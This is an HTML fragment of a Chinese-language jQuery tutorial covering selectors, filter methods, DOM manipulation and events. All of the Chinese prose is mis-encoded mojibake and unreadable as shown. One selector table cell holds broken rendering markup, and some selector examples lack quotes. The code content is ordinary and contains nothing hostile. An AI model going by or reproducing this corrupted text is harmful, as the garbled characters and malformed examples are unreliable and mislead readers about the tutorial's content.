<li>jQueryè¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒå¤§çš„ä¼˜åŠ¿æ˜¯ï¼Œå®ƒçš„æ–‡æ¡£è¯´æ˜å¾ˆå…¨ï¼Œè€Œä¸”å„ç§åº”ç”¨ä¹Ÿè¯´å¾—å¾ˆè¯¦ç»†ï¼ŒåŒæ—¶è¿˜æœ‰è®¸å¤šæˆç†Ÿçš„æ’ä»¶å¯ä¾›é€‰æ‹©</li>
</ol>
<p>JQueryçš„ç‰¹ç‚¹</p>
<ul>
<li>æ”¯æŒå„ç§ä¸»æµçš„æµè§ˆå™¨ã€‚</li>
<li>ä½¿ç”¨ç‰¹åˆ«ç®€å•</li>
<li>æ‹¥æœ‰ä¾¿æ·çš„æ’ä»¶æ‰©å±•æœºåˆ¶å’Œä¸°å¯Œçš„æ’ä»¶</li>
</ul>
<p><strong>å°è£…åŸç†</strong></p>
<ul>
<li>jsçš„å…¨å±€ä»£ç åŒºåªæœ‰ä¸€ä¸ªï¼Œè¿™æ ·å°±ä¼šé€ æˆåŒåå˜é‡çš„å€¼ä¼šè¢«è¦†ç›–ã€‚</li>
<li>ä½¿ç”¨å¯¹è±¡å°è£…ï¼Œå°†ä»£ç å°è£…åˆ°å¯¹è±¡ä¸­.ä½†æ˜¯å¯¹è±¡å¦‚æœè¢«è¦†ç›–ï¼Œåˆ™å…¨éƒ¨å¤±æ•ˆï¼Œé£é™©æé«˜ã€‚</li>
<li>ä½¿ç”¨å·¥å‚æ¨¡å¼,å°†ä»£ç è¿›è¡Œå°è£…ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è§£å†³é—®é¢˜</li>
<li>å°†å°è£…çš„å‡½æ•°åå­—å»é™¤ï¼Œé¿å…è¦†ç›–ã€‚ä½†æ˜¯å‡½æ•°æ²¡æœ‰åŠæ³•è°ƒç”¨äº†ã€‚</li>
<li>åŒ¿åè‡ªè°ƒç”¨ï¼Œå¯ä»¥åœ¨é¡µé¢åŠ è½½çš„æ—¶å€™è°ƒç”¨ä¸€æ¬¡ã€‚ä½†æ˜¯ä¸èƒ½é‡å¤è°ƒç”¨ï¼Œå¹¶ä¸”æ•°æ®æ²¡æœ‰åŠæ³•è·å–</li>
<li>ä½¿ç”¨é—­åŒ…,å°†æ•°æ®ä¸€æ¬¡æ€§æŒ‚è½½åˆ°windowå¯¹è±¡ä¸‹</li>
<li>é—­åŒ…åŸç†:åœ¨å…¨å±€åŒºä¸­ä¸èƒ½å¤Ÿè·å–å‡½æ•°ä½“å†…çš„æ•°æ®ã€‚ä½¿ç”¨æ›´å¤§ä½œç”¨åŸŸçš„å˜é‡æ¥è®°å½•å°ä½œç”¨åŸŸå˜é‡çš„å€¼ã€‚</li>
</ul>
<h2 id="jquery-æ ¸å¿ƒ" tabindex="-1"> JQuery æ ¸å¿ƒ</h2>
<h3 id="jquery-æ ¸å¿ƒå¯¹è±¡" tabindex="-1"> JQuery æ ¸å¿ƒå¯¹è±¡</h3>
<p><code>window.jQuery = window.$ = jQuery;</code></p>
<ul>
<li>åœ¨windowå¯¹è±¡ä¸­ï¼Œå¤šäº†ä¸¤ä¸ªå±æ€§ï¼Œå«åšjQuery å’Œ $</li>
<li>jQueryå±æ€§ å’Œ $å¯ä»¥ç›¸äº’æ›¿ä»£</li>
</ul>
<h3 id="jquery-å¯¹è±¡" tabindex="-1"> JQuery å¯¹è±¡</h3>
<p>jQuery å¯¹è±¡å°±æ˜¯é€šè¿‡jQueryåŒ…è£…DOMå¯¹è±¡åäº§ç”Ÿçš„å¯¹è±¡ã€‚jQuery å¯¹è±¡æ˜¯ jQuery ç‹¬æœ‰çš„ã€‚</p>
<p>è™½ç„¶jQueryå¯¹è±¡æ˜¯åŒ…è£…DOMå¯¹è±¡åäº§ç”Ÿçš„ï¼Œä½†æ˜¯jQueryæ— æ³•ä½¿ç”¨DOMå¯¹è±¡çš„ä»»ä½•æ–¹æ³•ï¼ŒåŒç†DOMå¯¹è±¡ä¹Ÿä¸èƒ½ä½¿ç”¨jQueryé‡Œçš„æ–¹æ³•</p>
<p>jQueryçš„åŸºç¡€è¯­æ³•ï¼š$(selector).action()</p>
<p><strong>JQueryå¯¹è±¡å’ŒDOMå¯¹è±¡äº’ç›¸è½¬æ¢</strong></p>
<div><pre><code><span>//DOM --> jquery</span>
<span>let</span> $div<span>=</span> <span>$</span><span>(</span>domå¯¹è±¡<span>)</span><span>;</span>
<span>//jquery ---> DOM</span>
<span>let</span> div <span>=</span> $div<span>[</span><span>0</span><span>]</span>
</code></pre></div><h3 id="æ³¨æ„ç‚¹" tabindex="-1"> æ³¨æ„ç‚¹</h3>
<p>ä»»ä½•jQuery å…ƒç´ å¯¹è±¡çš„èµ‹å€¼æ“ä½œï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯é€šè¿‡æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°èµ‹å€¼ï¼Œä¸ä¼šå‡ºç° =</p>
<h1 id="jquery-ä½¿ç”¨" tabindex="-1"> JQuery ä½¿ç”¨</h1>
<h2 id="é€‰æ‹©å™¨" tabindex="-1"> é€‰æ‹©å™¨</h2>
<p>jQueryä¸­é€‰æ‹©å™¨è·å–çš„æ˜¯å­˜å‚¨äº†HTMLå…ƒç´ å¯¹è±¡çš„æ•°ç»„ã€‚</p>
<p>jQueryè·å–çš„å…ƒç´ å¯¹è±¡ä¸èƒ½å¤Ÿç›´æ¥ä½¿ç”¨jsçš„å†…å®¹ï¼ŒæŒ‰ç…§æ•°ç»„çš„å–å‡ºæ–¹å¼å°†å¯¹è±¡å–å‡ºåå¯ä»¥ä½¿ç”¨jsçš„å†…å®¹ã€‚</p>
<h3 id="åŸºæœ¬é€‰æ‹©å™¨" tabindex="-1"> åŸºæœ¬é€‰æ‹©å™¨</h3>
<table>
<thead>
<tr>
<th>åç§°</th>
<th>é€‰æ‹©å™¨</th>
<th>å®ä¾‹</th>
<th>é€‰å–è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td>å…¨éƒ¨é€‰æ‹©å™¨</td>
<td>*</td>
<td>$(&quot;*&quot;)</td>
<td>æ‰€æœ‰å…ƒç´ </td>
</tr>
<tr>
<td>idé€‰æ‹©å™¨</td>
<td>#id</td>
<td>$(&quot;#id&quot;)</td>
<td>id=&quot;id&quot; çš„å…ƒç´ </td>
</tr>
<tr>
<td>ç±»é€‰æ‹©å™¨</td>
<td>.class</td>
<td>$(&quot;.classname&quot;)</td>
<td>æ‰€æœ‰ class=&quot;classname&quot; çš„å…ƒç´ </td>
</tr>
<tr>
<td>æ ‡ç­¾é€‰æ‹©å™¨</td>
<td>element</td>
<td>$(&quot;p&quot;)</td>
<td>æ‰€æœ‰ <code>&lt;p&gt;</code> å…ƒç´ </td>
</tr>
<tr>
<td>ç»„åˆé€‰æ‹©å™¨</td>
<td>s1,s2,s3</td>
<td>$(&quot;th,td,.intro&quot;)</td>
<td>æ‰€æœ‰å¸¦æœ‰åŒ¹é…é€‰æ‹©çš„å…ƒç´ </td>
</tr>
</tbody>
</table>
<h3 id="å±‚å é€‰æ‹©å™¨" tabindex="-1"> å±‚å é€‰æ‹©å™¨</h3>
<table>
<thead>
<tr>
<th>åç§°</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>åä»£é€‰æ‹©å™¨</td>
<td>$(div span)</td>
<td>é€‰å–æŸå…ƒç´ çš„åä»£å…ƒç´ </td>
</tr>
<tr>
<td>å­å…ƒç´ é€‰æ‹©å™¨</td>
<td>$(div &gt; span)</td>
<td>é€‰æ‹©ä½œä¸ºæŸå…ƒç´ å­å…ƒç´ çš„å…ƒç´ </td>
</tr>
<tr>
<td>ç›¸é‚»å…„å¼Ÿé€‰æ‹©å™¨</td>
<td>$(div + div )</td>
<td>é€‰æ‹©ç´§æ¥åœ¨å¦ä¸€å…ƒç´ åçš„å…ƒç´ ï¼Œä¸”äºŒè€…æœ‰ç›¸åŒçˆ¶å…ƒç´ Â  -----ç›¸åŒå†™æ³•Â  $(div).next(&quot;div&quot;);</td>
</tr>
<tr>
<td>æ™®é€šå…„å¼Ÿé€‰æ‹©å™¨</td>
<td>$(div ~ div)</td>
<td>é€‰å–æ‰€æœ‰æŒ‡å®šå…ƒç´ ä¹‹åçš„ç›¸é‚»å…„å¼Ÿå…ƒç´ Â  Â  Â  Â -----ç›¸åŒå†™æ³•Â  $(div).nextAll(&quot;div&quot;);</td>
</tr>
</tbody>
</table>
<h3 id="åŸºæœ¬è¿‡æ»¤é€‰æ‹©å™¨" tabindex="-1"> åŸºæœ¬è¿‡æ»¤é€‰æ‹©å™¨</h3>
<table>
<thead>
<tr>
<th>é€‰æ‹©å™¨</th>
<th>å®ä¾‹</th>
<th>é€‰å–è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td>:first</td>
<td>$(&quot;p:first&quot;)</td>
<td>ç¬¬ä¸€ä¸ª <code>&lt;p&gt;</code> å…ƒç´ </td>
</tr>
<tr>
<td>:last</td>
<td>$(&quot;p:last&quot;)</td>
<td>æœ€åä¸€ä¸ª <code>&lt;p&gt;</code> å…ƒç´ </td>
</tr>
<tr>
<td>:even</td>
<td>$(&quot;tr:even&quot;)</td>
<td>æ‰€æœ‰å¶æ•° <code>&lt;tr&gt;</code> å…ƒç´ </td>
</tr>
<tr>
<td>:odd</td>
<td>$(&quot;tr:odd&quot;)</td>
<td>æ‰€æœ‰å¥‡æ•° <code>&lt;tr&gt;</code> å…ƒç´ </td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>:eq(index)</td>
<td>$(&quot;ul li:eq(3)&quot;)</td>
<td>åˆ—è¡¨ä¸­çš„ç¬¬å››ä¸ªå…ƒç´ ï¼ˆindex ä» 0 å¼€å§‹ï¼‰</td>
</tr>
<tr>
<td>:gt(no)</td>
<td>$(&quot;ul li:gt(3)&quot;)</td>
<td>åˆ—å‡º index å¤§äº 3 çš„å…ƒç´ </td>
</tr>
<tr>
<td>:lt(no)</td>
<td>$(&quot;ul li:lt(3)&quot;)</td>
<td>åˆ—å‡º index å°äº 3 çš„å…ƒç´ </td>
</tr>
<tr>
<td>:not(selector)</td>
<td>$(&quot;input:not(:empty)&quot;)</td>
<td>æ‰€æœ‰ä¸ä¸ºç©ºçš„ input å…ƒç´ </td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>:header</td>
<td>$(&quot;:header&quot;)</td>
<td>æ‰€æœ‰æ ‡é¢˜å…ƒç´  <code>&lt;h1&gt; - &lt;h6&gt;</code></td>
</tr>
<tr>
<td>:animated</td>
<td></td>
<td>æ‰€æœ‰åŠ¨ç”»å…ƒç´ </td>
</tr>
</tbody>
</table>
<h3 id="å±æ€§é€‰æ‹©å™¨" tabindex="-1"> å±æ€§é€‰æ‹©å™¨</h3>
<table>
<thead>
<tr>
<th>é€‰æ‹©å™¨</th>
<th>å®ä¾‹</th>
<th>é€‰å–è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td>[attribute]</td>
<td>$(&quot;[href]&quot;)</td>
<td>æ‰€æœ‰å¸¦æœ‰ href å±æ€§çš„å…ƒç´ </td>
</tr>
<tr>
<td>[attribute=value]</td>
<td>$(&quot;[href='#']&quot;)</td>
<td>æ‰€æœ‰ href å±æ€§çš„å€¼ç­‰äº &quot;#&quot; çš„å…ƒç´ </td>
</tr>
<tr>
<td>[attribute!=value]</td>
<td>$(&quot;[href!='#']&quot;)</td>
<td>æ‰€æœ‰ href å±æ€§çš„å€¼ä¸ç­‰äº &quot;#&quot; çš„å…ƒç´ </td>
</tr>
<tr>
<td>[attribute$=value]</td>
<td><span><span><i>Content not supported</i></span><span aria-hidden="true"><span><span style="height:1em;vertical-align:-0.25em;"></span><span>(</span><span>&quot;</span><span>[</span><span>h</span><span>re</span><span style="margin-right:0.10764em;">f</span></span></span></span>='.jpg']&quot;)</td>
<td>æ‰€æœ‰ href å±æ€§çš„å€¼åŒ…å«ä»¥ &quot;.jpg&quot; ç»“å°¾çš„å…ƒç´ </td>
</tr>
</tbody>
</table>
<h3 id="å†…å®¹è¿‡æ»¤é€‰æ‹©å™¨" tabindex="-1"> å†…å®¹è¿‡æ»¤é€‰æ‹©å™¨</h3>
<table>
<thead>
<tr>
<th>é€‰æ‹©å™¨</th>
<th>å®ä¾‹</th>
<th>é€‰å–è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td>:contains(text)</td>
<td>$(&quot;:contains('W3School')&quot;)</td>
<td>åŒ…å«æŒ‡å®šå­—ç¬¦ä¸²çš„æ‰€æœ‰å…ƒç´ </td>
</tr>
<tr>
<td>:empty</td>
<td>$(&quot;:empty&quot;)</td>
<td>æ— å­ï¼ˆå…ƒç´ ï¼‰èŠ‚ç‚¹çš„æ‰€æœ‰å…ƒç´ </td>
</tr>
</tbody>
</table>
<h3 id="å¯è§æ€§é€‰æ‹©å™¨" tabindex="-1"> å¯è§æ€§é€‰æ‹©å™¨</h3>
<table>
<thead>
<tr>
<th>é€‰æ‹©å™¨</th>
<th>å®ä¾‹</th>
<th>é€‰å–è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td>:hidden</td>
<td>$(&quot;p:hidden&quot;)</td>
<td>æ‰€æœ‰éšè—çš„ <code>&lt;p&gt;</code> å…ƒç´ </td>
</tr>
<tr>
<td>:visible</td>
<td>$(&quot;table:visible&quot;)</td>
<td>æ‰€æœ‰å¯è§çš„è¡¨æ ¼</td>
</tr>
<tr>
<td>:has</td>
<td>$(&quot;td:has('p')&quot;)</td>
<td>é€‰æ‹©è¯¥å…ƒç´ æœ‰pæ ‡ç­¾çš„å…ƒç´ </td>
</tr>
<tr>
<td>:parent</td>
<td>$(&quot;td:parent&quot;)</td>
<td>é€‰æ‹©å«æœ‰å­å…ƒç´ æˆ–è€…æ–‡æœ¬çš„å…ƒç´ </td>
</tr>
</tbody>
</table>
<h3 id="è¡¨å•é€‰æ‹©å™¨" tabindex="-1"> è¡¨å•é€‰æ‹©å™¨</h3>
<table>
<thead>
<tr>
<th>é€‰æ‹©å™¨</th>
<th>å®ä¾‹</th>
<th>é€‰å–è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td>:input</td>
<td>$(&quot;:input&quot;)</td>
<td>æ‰€æœ‰ <code>&lt;input&gt;</code> å…ƒç´ </td>
</tr>
<tr>
<td>:text</td>
<td>$(&quot;:text&quot;)</td>
<td>æ‰€æœ‰ type=&quot;text&quot; çš„ <code>&lt;input&gt;</code> å…ƒç´ </td>
</tr>
<tr>
<td>:password</td>
<td>$(&quot;:password&quot;)</td>
<td>æ‰€æœ‰ type=&quot;password&quot; çš„ <code>&lt;input&gt;</code> å…ƒç´ </td>
</tr>
<tr>
<td>:radio</td>
<td>$(&quot;:radio&quot;)</td>
<td>æ‰€æœ‰ type=&quot;radio&quot; çš„ <code>&lt;input&gt;</code> å…ƒç´ </td>
</tr>
<tr>
<td>:checkbox</td>
<td>$(&quot;:checkbox&quot;)</td>
<td>æ‰€æœ‰ type=&quot;checkbox&quot; çš„ <code>&lt;input&gt;</code> å…ƒç´ </td>
</tr>
<tr>
<td>:submit</td>
<td>$(&quot;:submit&quot;)</td>
<td>æ‰€æœ‰ type=&quot;submit&quot; çš„ <code>&lt;input&gt;</code> å…ƒç´ </td>
</tr>
<tr>
<td>:reset</td>
<td>$(&quot;:reset&quot;)</td>
<td>æ‰€æœ‰ type=&quot;reset&quot; çš„ <code>&lt;input&gt;</code> å…ƒç´ </td>
</tr>
<tr>
<td>:button</td>
<td>$(&quot;:button&quot;)</td>
<td>æ‰€æœ‰ type=&quot;button&quot; çš„ <code>&lt;input&gt;</code> å…ƒç´ </td>
</tr>
<tr>
<td>:image</td>
<td>$(&quot;:image&quot;)</td>
<td>æ‰€æœ‰ type=&quot;image&quot; çš„ <code>&lt;input&gt;</code> å…ƒç´ </td>
</tr>
<tr>
<td>:file</td>
<td>$(&quot;:file&quot;)</td>
<td>æ‰€æœ‰ type=&quot;file&quot; çš„ <code>&lt;input&gt;</code> å…ƒç´ </td>
</tr>
</tbody>
</table>
<h3 id="çŠ¶æ€è¿‡æ»¤é€‰æ‹©å™¨" tabindex="-1"> çŠ¶æ€è¿‡æ»¤é€‰æ‹©å™¨</h3>
<table>
<thead>
<tr>
<th>é€‰æ‹©å™¨</th>
<th>å®ä¾‹</th>
<th>é€‰å–è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td>:enabled</td>
<td>$(&quot;:enabled&quot;)</td>
<td>æ‰€æœ‰å¯ç”¨çš„å…ƒç´ </td>
</tr>
<tr>
<td>:disabled</td>
<td>$(&quot;:disabled&quot;)</td>
<td>æ‰€æœ‰ç¦ç”¨çš„å…ƒç´ </td>
</tr>
<tr>
<td>:selected</td>
<td>$(&quot;:selected&quot;)</td>
<td>æ‰€æœ‰é€‰å®šçš„ä¸‹æ‹‰åˆ—è¡¨å…ƒç´ </td>
</tr>
<tr>
<td>:checked</td>
<td>$(&quot;:checked&quot;)</td>
<td>æ‰€æœ‰é€‰ä¸­çš„å¤é€‰æ¡†é€‰é¡¹</td>
</tr>
</tbody>
</table>
<h2 id="ç­›é€‰å™¨æ–¹æ³•" tabindex="-1"> ç­›é€‰å™¨æ–¹æ³•</h2>
<h3 id="åŸºæœ¬ç­›é€‰å™¨" tabindex="-1"> åŸºæœ¬ç­›é€‰å™¨</h3>
<ul>
<li>.first() ---è·å–åŒ¹é…çš„ç¬¬ä¸€ä¸ªå…ƒç´ </li>
<li>.last() ---è·å–åŒ¹é…çš„æœ€åä¸€ä¸ªå…ƒç´ </li>
<li>.not() ---ä»åŒ¹é…å…ƒç´ çš„é›†åˆä¸­åˆ é™¤ä¸æŒ‡å®šè¡¨è¾¾å¼åŒ¹é…çš„å…ƒç´ </li>
<li>.has() ---ä¿ç•™åŒ…å«ç‰¹å®šåä»£çš„å…ƒç´ ï¼Œå»æ‰é‚£äº›ä¸å«æœ‰æŒ‡å®šåä»£çš„å…ƒç´ ã€‚</li>
<li>.eq() ---ç´¢å¼•å€¼ç­‰äºæŒ‡å®šå€¼çš„å…ƒç´ </li>
</ul>
<h3 id="æŸ¥æ‰¾ç­›é€‰å™¨" tabindex="-1"> æŸ¥æ‰¾ç­›é€‰å™¨</h3>
<ul>
<li>.children()   ---è¿”å›åŒ¹é…å…ƒç´ é›†åˆä¸­æ¯ä¸ªå…ƒç´ çš„æ‰€æœ‰å­å…ƒç´ ï¼ˆä»…å„¿å­è¾ˆï¼‰ã€‚å‚æ•°å¯é€‰ï¼Œæ·»åŠ å‚æ•°è¡¨ç¤ºé€šè¿‡é€‰æ‹©å™¨è¿›è¡Œè¿‡æ»¤ï¼Œå¯¹å…ƒç´ è¿›è¡Œç­›é€‰</li>
<li>.find()   ---æ–¹æ³•æ˜¯è¿”å›åŒ¹é…å…ƒç´ é›†åˆä¸­æ¯ä¸ªå…ƒç´ çš„åä»£ã€‚å‚æ•°æ˜¯å¿…é€‰çš„ï¼Œå¯ä»¥ä¸ºé€‰æ‹©å™¨ã€jqueryå¯¹è±¡å¯å…ƒç´ æ¥å¯¹å…ƒç´ è¿›è¡Œç­›é€‰ã€‚</li>
<li>.siblings(expr) æŸ¥æ‰¾æ‰€æœ‰å…„å¼Ÿï¼ˆåŒ…æ‹¬å“¥å“¥å’Œå¼Ÿå¼Ÿï¼‰</li>
<li>.next(expr) ---æŸ¥æ‰¾ç´§æŒ¨ç€çš„å¼Ÿå¼Ÿ</li>
<li>.nextAll(expr) ---æŸ¥æ‰¾æ‰€æœ‰çš„å¼Ÿå¼Ÿ</li>
<li>.nextUntil(expr) ---æŸ¥æ‰¾æ‰€æœ‰å¼Ÿå¼Ÿï¼Œç›´åˆ°ç¢°åˆ°ç¬¦åˆexpræ¡ä»¶ï¼Œä¸åŒ…å«ç¬¦åˆexpræ¡ä»¶çš„é‚£ä¸ªå…ƒç´ </li>
<li>.prev(expr) ---æŸ¥æ‰¾ç´§æŒ¨ç€çš„å“¥å“¥</li>
<li>.prevAll(expr) ---æŸ¥æ‰¾æ‰€æœ‰å“¥å“¥</li>
<li>.prevUntil(expr) ---æŸ¥æ‰¾æ‰€æœ‰å“¥å“¥ï¼Œç›´åˆ°ç¢°åˆ°ç¬¦åˆexpræ¡ä»¶ï¼Œä¸åŒ…å«ç¬¦åˆexpræ¡ä»¶çš„é‚£ä¸ªå…ƒç´ </li>
<li>.parent()   ---æŸ¥æ‰¾å½“å‰å…ƒç´ çš„çˆ¶å…ƒç´ </li>
<li>.parents()  ---æŸ¥æ‰¾å½“å‰å…ƒç´ çš„æ‰€æœ‰çš„çˆ¶è¾ˆå…ƒç´ ï¼ˆçˆ·çˆ·è¾ˆã€ç¥–å…ˆè¾ˆéƒ½æ‰¾åˆ°ï¼‰</li>
</ul>
<p><strong>expr</strong> æ˜¯æŒ‡å¯é€‰çš„å‚æ•°ï¼ŒåŒ…å«ç”¨äºåŒ¹é…å…ƒç´ çš„é€‰æ‹©å™¨è¡¨è¾¾å¼ã€‚</p>
<h2 id="æ“ä½œå…ƒç´ " tabindex="-1"> æ“ä½œå…ƒç´ </h2>
<h3 id="æ“ä½œå…ƒç´ å†…å®¹" tabindex="-1"> æ“ä½œå…ƒç´ å†…å®¹</h3>
<ul>
<li>$().html() æ— å‚å–å€¼ï¼Œæœ‰å‚èµ‹å€¼ï¼Œæ³¨æ„ï¼šå–å€¼å–æ ‡ç­¾ï¼Œèµ‹å€¼è§£ææ ‡ç­¾</li>
<li>$().text() æ— å‚å–å€¼ï¼Œæœ‰å‚èµ‹å€¼ï¼Œæ³¨æ„ï¼šå–å€¼ä¸å–æ ‡ç­¾ï¼Œèµ‹å€¼ä¸è§£ææ ‡ç­¾</li>
<li>$().val()  æ— å‚å–å€¼ï¼Œæœ‰å‚èµ‹å€¼ï¼Œç›¸å½“äºè¡¨å•ç»„ä»¶çš„value</li>
</ul>
<h3 id="æ“ä½œå…ƒç´ æ ·å¼" tabindex="-1"> æ“ä½œå…ƒç´ æ ·å¼</h3>
<p><strong>è®¿é—®class</strong></p>
<ul>
<li>$().addClass(&quot;æ ·å¼å&quot;) æ·»åŠ æ ·å¼</li>
<li>$().removeClass(&quot;æ ·å¼å&quot;) ç§»é™¤æŒ‡å®šçš„CSSç±»å</li>
<li>$().removeClass() ç§»é™¤æ‰€æœ‰æ ·å¼</li>
<li>$().hasClass() åˆ¤æ–­æ ·å¼å­˜ä¸å­˜åœ¨</li>
<li>$().toggleClass(â€œæ ·å¼åâ€) åˆ‡æ¢CSSç±»åï¼Œæœ‰åˆ™åˆ é™¤ï¼Œæ²¡æœ‰åˆ™æ·»åŠ </li>
</ul>
<p><strong>è®¿é—®css</strong></p>
<ul>
<li>$().css(&quot;æ ·å¼å&quot;) å–å€¼æ“ä½œ ( åŸå§‹cssæ ·å¼ background-color )</li>
<li>$().css(&quot;æ ·å¼å&quot;,&quot;æ ·å¼å€¼&quot;) èµ‹å€¼æ“ä½œ</li>
<li>$().css({}) ä¸€æ¬¡æ€§ä¿®æ”¹å¤šä¸ªcssæ ·å¼ï¼Œå‚æ•°æ˜¯jsonå¯¹è±¡ï¼Œå¯¹è±¡å±æ€§åæ˜¯csså±æ€§åï¼Œå¯¹è±¡å€¼æ˜¯csså±æ€§å€¼</li>
<li>$().width() ã€ $().height() æ— å‚å–å€¼ï¼Œæœ‰å‚èµ‹å€¼</li>
</ul>
<h3 id="æ“ä½œå…ƒç´ å±æ€§" tabindex="-1"> æ“ä½œå…ƒç´ å±æ€§</h3>
<p><strong>attr()</strong> æŸ¥çœ‹è®¾ç½®å±æ€§</p>
<ul>
<li>$().attr(attribute)  æŸ¥çœ‹è¯¥å±æ€§çš„å€¼</li>
<li>$().attr(attribute, &quot;xx&quot;)// è®¾ç½®ä¸€ä¸ªå±æ€§å€¼</li>
<li>$().attr({k1: v1, k2:v2})// è®¾ç½®å¤šä¸ªå±æ€§å€¼ï¼Œå‚æ•°æ˜¯jsonå¯¹è±¡</li>
<li>$().removeAttr(&quot;å±æ€§&quot;)// ä»æ¯ä¸€ä¸ªåŒ¹é…çš„å…ƒç´ ä¸­åˆ é™¤ä¸€ä¸ªå±æ€§</li>
</ul>
<p><strong>prop()</strong> æŸ¥çœ‹,è®¾ç½®å±æ€§çš„çŠ¶æ€(ä¸»è¦åº”ç”¨äº:checked,selected,disabled)</p>
<ul>
<li>prop(&quot;checked&quot;)</li>
<li>prop(&quot;checked&quot;,true) //è®¾ç½®ä¸ºé€‰ä¸­</li>
<li>prop(&quot;checked&quot;,false) //å–æ¶ˆé€‰ä¸­</li>
</ul>
<h2 id="æ“ä½œæ–‡æ¡£" tabindex="-1"> æ“ä½œæ–‡æ¡£</h2>
<p><strong>å†…éƒ¨æ’å…¥</strong></p>
<ul>
<li>$(a).append(b)        //å°†bæ·»åŠ åˆ°aæ ‡ç­¾é‡Œé¢</li>
<li>$(a).appendTo(b)      //ä¸ä¸Šé¢çš„ç›¸å</li>
<li>$(a).prepend(b)       //å‰ç½®æ·»åŠ </li>
<li>$(a).prependTo(b)     //ä¸ä¸Šé¢çš„ç›¸å</li>
</ul>
<p><strong>å¤–éƒ¨æ’å…¥</strong></p>
<ul>
<li>$(a).after(b)         //å°†åè€…æ”¾åˆ°å‰è€…çš„åé¢</li>
<li>$(a).insertAfter(b)   //æŠŠå‰è€…æ”¾åˆ°åè€…çš„åé¢</li>
<li>$(a).before(b)        // å°†åè€…æ”¾åˆ°å‰è€…çš„å‰é¢</li>
<li>$(a).insertBefore(b)  //æŠŠå‰è€…æ”¾åˆ°åè€…çš„å‰é¢</li>
</ul>
<p><strong>åŒ…è£¹</strong></p>
<p><strong>æ›¿æ¢</strong></p>
<ul>
<li>$(a).replaceWith(b)   //å‰è€…è¢«åè€…æ‰€å–ä»£(æ›¿æ¢)</li>
<li>$(a).replaceAll(b)    //å‰è€…å–ä»£åè€…(æ›¿æ¢)</li>
</ul>
<p><strong>åˆ é™¤</strong></p>
<ul>
<li>remove()              //æ–¹æ³•åˆ é™¤è¢«é€‰å…ƒç´ åŠå…¶å­å…ƒç´ </li>
<li>empty()               //æ–¹æ³•åˆ é™¤è¢«é€‰å…ƒç´ çš„å­å…ƒç´ </li>
</ul>
<h2 id="äº‹ä»¶" tabindex="-1"> äº‹ä»¶</h2>
<h3 id="äº‹ä»¶è¯´æ˜" tabindex="-1"> äº‹ä»¶è¯´æ˜</h3>
<p>äº‹ä»¶åæŒ‡çš„æ˜¯ï¼šåŸå§‹JavaScriptäº‹ä»¶ï¼Œå»æ‰onã€‚</p>
<table>
<thead>
<tr>
<th>äº‹ä»¶</th>
<th>è§¦å‘æ¡ä»¶</th>
</tr>
</thead>
<tbody>
<tr>
<td>click</td>
<td>é¼ æ ‡å•å‡»å,è§¦å‘...</td>
</tr>
<tr>
<td>dblclick</td>
<td>é¼ æ ‡åŒå‡»å,è§¦å‘..</td>
</tr>
<tr>
<td>mouseenter</td>
<td>å½“é¼ æ ‡æŒ‡é’ˆç»è¿‡æˆ–æ‚¬åœåœ¨è¢«é€‰å…ƒç´ æ—¶,è§¦å‘...</td>
</tr>
<tr>
<td>mouseleave</td>
<td>å½“é¼ æ ‡æŒ‡é’ˆç¦»å¼€è¢«é€‰å…ƒç´ æ—¶ï¼Œä¼šå‘ç”Ÿ mouseleave äº‹ä»¶ã€‚</td>
</tr>
<tr>
<td>keypress</td>
<td>é”®è¢«æŒ‰ä¸‹</td>
</tr>
<tr>
<td>keydown</td>
<td>é”®æŒ‰ä¸‹çš„è¿‡ç¨‹</td>
</tr>
<tr>
<td>keyup</td>
<td>é”®è¢«æ¾å¼€</td>
</tr>
<tr>
<td>hover</td>
<td>é¼ æ ‡æŒ‡é’ˆæ‚¬åœåœ¨è¢«é€‰å…ƒç´ ä¸Šæ—¶è¦è¿è¡Œçš„ä¸¤ä¸ªå‡½æ•°ã€‚æ–¹æ³•è§¦å‘mouseenterå’Œmouseleaveäº‹ä»¶(å®é™…ä¸Šæ˜¯å¯¹è¿™ä¿©æ–¹æ³•çš„å°è£…)</td>
</tr>
<tr>
<td>submit()</td>
<td>å½“æäº¤è¡¨å•æ—¶,è§¦å‘...</td>
</tr>
<tr>
<td>change()</td>
<td>å½“å…ƒç´ çš„å€¼æ”¹å˜æ—¶(ä»…é€‚ç”¨äºè¡¨å•å­—æ®µ),è§¦å‘...</td>
</tr>
<tr>
<td>focus()</td>
<td>å½“å…ƒç´ è·å¾—ç„¦ç‚¹æ—¶ï¼ˆå½“é€šè¿‡é¼ æ ‡ç‚¹å‡»é€‰ä¸­å…ƒç´ æˆ–é€šè¿‡ tab é”®å®šä½åˆ°å…ƒç´ æ—¶ï¼‰è§¦å‘...(è¯¥æ–¹æ³•é€šå¸¸ä¸blur()æ–¹æ³•ä¸€èµ·ä½¿ç”¨)</td>
</tr>
<tr>
<td>blur</td>
<td>å½“å…ƒç´ å¤±å»ç„¦ç‚¹æ—¶,è§¦å‘...</td>
</tr>
<tr>
<td>resize</td>
<td>å½“è°ƒæ•´æµè§ˆå™¨çª—å£å¤§å°æ—¶ï¼Œè§¦å‘...</td>
</tr>
<tr>
<td>scroll</td>
<td>å½“ç”¨æˆ·æ»šåŠ¨æŒ‡å®šçš„å…ƒç´ æ—¶ï¼Œè§¦å‘...</td>
</tr>
</tbody>
</table>
<h3 id="åŠ¨æ€äº‹ä»¶ç»‘å®š" tabindex="-1"> åŠ¨æ€äº‹ä»¶ç»‘å®š</h3>
<ul>
<li>$().äº‹ä»¶å(äº‹ä»¶å¤„ç†å‡½æ•°)          $(&quot;#d&quot;).click(function(){})</li>
